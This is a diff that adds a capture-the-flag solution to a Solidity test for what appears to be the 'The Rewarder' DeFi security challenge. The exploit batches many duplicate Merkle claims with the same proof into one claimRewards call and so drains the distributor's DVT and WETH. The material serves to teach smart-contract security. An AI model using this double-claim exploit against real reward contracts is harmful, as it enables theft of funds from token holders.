@@ -148,7 +148,70 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        console.log("### test_theRewarder start ###");
+        console.log("Player Address", player);
+
+        console.log("");
+        console.log("#1 Before attack");
+        console.log("DVT remaining to distribute", distributor.getRemaining(address(dvt))/1e16);
+        console.log("WETH remaining to distribute", distributor.getRemaining(address(weth))/1e15);
+        console.log("DVT to player", dvt.balanceOf(address(player))/1e16);
+        console.log("WETH to player", weth.balanceOf(address(player))/1e15);
+
+        console.log("");
+        console.log("#2 Run attack");
+        run_attack();
+
+        console.log("");
+        console.log("#3 After attack");
+        console.log("DVT remaining to distribute", distributor.getRemaining(address(dvt))/1e16);
+        console.log("WETH remaining to distribute", distributor.getRemaining(address(weth))/1e15);
+        console.log("DVT to player", dvt.balanceOf(address(player))/1e16);
+        console.log("WETH to player", weth.balanceOf(address(player))/1e15);
+
+        console.log("");
+        console.log("#4 Transfer all tokens to recovery address");
+        IERC20(address(dvt)).transfer(recovery, dvt.balanceOf(address(player)));
+        IERC20(address(weth)).transfer(recovery, weth.balanceOf(address(player)));
+
+        console.log("");
+        console.log("### test_sideEntrance end ###");
+    }
+
+    function run_attack() internal {
+        uint256 playerDvtAmount = 11524763827831882;
+        uint256 playerWethAmount = 1171088749244340;
+        uint256 dvtCount = distributor.getRemaining(address(dvt)) / playerDvtAmount;
+        uint256 wethCount = distributor.getRemaining(address(weth)) / playerWethAmount;
+        uint256 totalCount = dvtCount + wethCount;
+        Claim[] memory claims = new Claim[](totalCount);
+        IERC20[] memory tokensToClaim = new IERC20[](totalCount);
+
+        uint256 playerDvtIndex = 188;
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        for (uint256 i = 0; i < dvtCount; i++) {
+            tokensToClaim[i] = IERC20(address(dvt));
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: playerDvtAmount,
+                tokenIndex: i,
+                proof: merkle.getProof(dvtLeaves, playerDvtIndex)
+            });
+        }
+
+        uint256 playerWethIndex = 188;
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        for (uint256 i = dvtCount; i < totalCount; i++) {
+            tokensToClaim[i] = IERC20(address(weth));
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: playerWethAmount,
+                tokenIndex: i,
+                proof: merkle.getProof(wethLeaves, playerWethIndex)
+            });
+        }
+
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
     }
 
     /**
